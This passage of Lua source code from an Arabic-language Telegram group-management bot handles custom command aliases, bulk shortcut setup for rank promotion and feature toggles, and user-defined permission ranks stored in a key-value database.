return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧ عذرا الامر ليس لك .")..'&show_alert=true')
end
end

end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevHmD:get(DevTwix.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevHmD:get(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevHmD:del(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevHmD:del(DevTwix.."Set:Cmd:Group:New"..msg.chat_id_)
DevHmD:srem(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevHmD:del(DevTwix.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevHmD:get(DevTwix..'HmD:NameBot') or "تويكس")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevHmD:get(DevTwix..'HmD:NameBot') or "تويكس")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevHmD:get(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevHmD:get(DevTwix.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevHmD:set(DevTwix.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل الامر الجديد", 1, 'html')
DevHmD:del(DevTwix.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevHmD:set(DevTwix.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevHmD:get(DevTwix.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevHmD:get(DevTwix.."Set:Cmd:Group:New"..msg.chat_id_)
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ الامر", 1, 'html')
DevHmD:del(DevTwix.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevHmD:smembers(DevTwix.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⋄︙قائمة الاوامر المضافه »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
Cmds = DevHmD:get(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "⋄︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" and ChCheck(msg) or text == "حذف الاوامر" and ChCheck(msg) or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevHmD:smembers(DevTwix.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevHmD:del(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevHmD:del(DevTwix.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
---------------------------------------------------------------------------------------
if text == "ترتيب الكل" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تا","تاك للكل")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":حذ","حذف رد")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"حذ")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ت","تثبيت")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ت")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك اس","تنزيل منشئ اساسي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك اس")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك من","تنزيل منشئ")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك من")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك مد","تنزيل مدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك مد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك اد","تنزيل ادمن")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك اد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك م","تنزيل مميز")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك م")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط ر","تعطيل الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط ا","تعطيل الايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط لع","تعطيل الالعاب")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط لع")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط كو","تعطيل كول")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط كو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط صو","تعطيل صورتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط صو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع ر","تفعيل الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع ا","تفعيل الايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع لع","تفعيل الالعاب")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع لع")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع كو","تفعيل كول")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع كو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع صو","تفعيل صورتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع صو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر الخدمة التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر ايدي : *ا*\n⋄︙امر الرابط : *ر*\n⋄︙*امر تثبيت : ت*\n⋄︙امر غنيلي :* غ*\n⋄︙امر تاك للكل : *تا*\n⋄︙امر اضف رد : *رد*\n⋄︙*امر حذف رد : حذ*\n⋄︙امر مسح رسائلي : *رس*\n⋄︙امر مسح سحكاتي : *سح*\n⋄︙امر ردود المدير : *رر*\n⋄︙امر مسح المكتومين :* ،،*\n⋄︙امر مسح قائمه العام : *#*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*تم ترتيب اوامر الرفع التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر رفع مميز : *م*\n⋄︙امر رفع ادمن : *اد*\n⋄︙امر رفع مدير : *مد*\n⋄︙امر رفع منشئ : *من*\n⋄︙امر رفع مطور : *مط*\n⋄︙امر رفع منشئ اساسي : *اس*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*تم ترتيب اوامر التنزيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تنزيل مميز : *تك م*\n⋄︙امر تنزيل ادمن : *تك اد*\n⋄︙امر تنزيل مدير : *تك مد*\n⋄︙امر تنزيل منشئ : *تك من*\n⋄︙امر تنزيل جميع الرتب : *تك*\n⋄︙امر تنزيل منشئ اساسي : *تك اس*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*تم ترتيب اوامر التعطيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تعطيل كول : *تعط كو*\n⋄︙امر تعطيل الايدي : *تعط ا*\n⋄︙امر تعطيل الالعاب : *تعط لع*\n⋄︙امر تعطيل صورتي : *تعط صو*\n⋄︙امر تعطيل الايدي بالصورة : *تعط*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*تم ترتيب اوامر التفعيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تفعيل كول : *تفع كو*\n⋄︙امر تفعيل الايدي : *تفع ا*\n⋄︙امر تفعيل الالعاب : *تفع لع*\n⋄︙امر تفعيل صورتي : *تفع صو*\n⋄︙امر تفعيل الايدي بالصورة : *تفع*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end
---------------------------------------------------------------------------------------
if text == "ترتيب الاوامر" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تا","تاك للكل")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":حذ","حذف رد")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"حذ")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":ت","تثبيت")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"ت")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"غ")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر الخدمة التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر ايدي : *ا*\n⋄︙امر الرابط : *ر*\n⋄︙*امر تثبيت : ت*\n⋄︙امر غنيلي :* غ*\n⋄︙امر تاك للكل : *تا*\n⋄︙امر اضف رد : *رد*\n⋄︙*امر حذف رد : حذ*\n⋄︙امر مسح رسائلي : *رس*\n⋄︙امر مسح سحكاتي : *سح*\n⋄︙امر ردود المدير : *رر*\n⋄︙امر مسح المكتومين :* ،،*\n⋄︙امر مسح قائمه العام : *#*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end
if text == "ترتيب اوامر الرفع" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"اس")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر الرفع التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر رفع مميز : *م*\n⋄︙امر رفع ادمن : *اد*\n⋄︙امر رفع مدير : *مد*\n⋄︙امر رفع منشئ : *من*\n⋄︙امر رفع مطور : *مط*\n⋄︙امر رفع منشئ اساسي : *اس*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end
if text == "ترتيب اوامر التنزيل" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك اس","تنزيل منشئ اساسي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك اس")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك من","تنزيل منشئ")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك من")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك مد","تنزيل مدير")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك مد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك اد","تنزيل ادمن")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك اد")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك م","تنزيل مميز")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك م")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تك")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر التنزيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تنزيل مميز : *تك م*\n⋄︙امر تنزيل ادمن : *تك اد*\n⋄︙امر تنزيل مدير : *تك مد*\n⋄︙امر تنزيل منشئ : *تك من*\n⋄︙امر تنزيل جميع الرتب : *تك*\n⋄︙امر تنزيل منشئ اساسي : *تك اس*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end
if text == "ترتيب اوامر التفعيل" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع ر","تفعيل الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع ا","تفعيل الايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع لع","تفعيل الالعاب")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع لع")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع كو","تفعيل كول")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع كو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع صو","تفعيل صورتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع صو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر التفعيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تفعيل كول : *تفع كو*\n⋄︙امر تفعيل الايدي : *تفع ا*\n⋄︙امر تفعيل الالعاب : *تفع لع*\n⋄︙امر تفعيل صورتي : *تفع صو*\n⋄︙امر تفعيل الايدي بالصورة : *تفع*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end
if text == "ترتيب اوامر التعطيل" and Constructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط ر","تعطيل الرابط")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط ر")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط ا","تعطيل الايدي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط ا")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط لع","تعطيل الالعاب")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط لع")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط كو","تعطيل كول")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط كو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط صو","تعطيل صورتي")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط صو")
DevHmD:set(DevTwix.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevHmD:sadd(DevTwix.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
send(msg.chat_id_, msg.id_,"⋄︙*تم ترتيب اوامر التعطيل التالية ↯ .*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙امر تعطيل كول : *تعط كو*\n⋄︙امر تعطيل الايدي : *تعط ا*\n⋄︙امر تعطيل الالعاب : *تعط لع*\n⋄︙امر تعطيل صورتي : *تعط صو*\n⋄︙امر تعطيل الايدي بالصورة : *تعط*\n*•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••*\n⋄︙*Ch Source ← @DevTwix .*")
end

if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevHmD:set(DevTwix.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" and ChCheck(msg) or text == "مسح امر" and ChCheck(msg) then 
DevHmD:set(DevTwix.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
---------------------------------------------------------------------------------------
if text == "الصلاحيات" and ChCheck(msg) or text == "صلاحيات" and ChCheck(msg) then 
local List = DevHmD:smembers(DevTwix.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⋄︙قائمة الصلاحيات المضافه »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
var = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevHmD:smembers(DevTwix.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevHmD:del(DevTwix.."Comd:New:rt:HmD:"..v..msg.chat_id_)
DevHmD:del(DevTwix.."Coomds"..msg.chat_id_)
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevHmD:set(DevTwix.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevHmD:sadd(DevTwix.."Coomds"..msg.chat_id_,ComdNew)  
DevHmD:setex(DevTwix.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⋄︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevHmD:del(DevTwix.."Comd:New:rt:HmD:"..ComdNew..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف الصلاحيه", 1, 'html')
end
if DevHmD:get(DevTwix.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^» الغاء ✧$") then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر", 1, 'html')
DevHmD:del(DevTwix.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⋄︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تستطيع اضافة صلاحية ( عضو • مميز )\n⋄︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تستطيع اضافة صلاحية ( عضو )\n⋄︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevHmD:get(DevTwix.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevHmD:set(DevTwix.."Comd:New:rt:HmD:"..textn..msg.chat_id_,text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اضافة الصلاحيه", 1, 'html')
DevHmD:del(DevTwix.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_HmD = text:match("رفع (.*)")
if DevHmD:sismember(DevTwix.."Coomds"..msg.chat_id_,DEV_HmD) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrHmD = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..DEV_HmD..msg.chat_id_)
if mrHmD == "مميز" and VipMem(msg) then
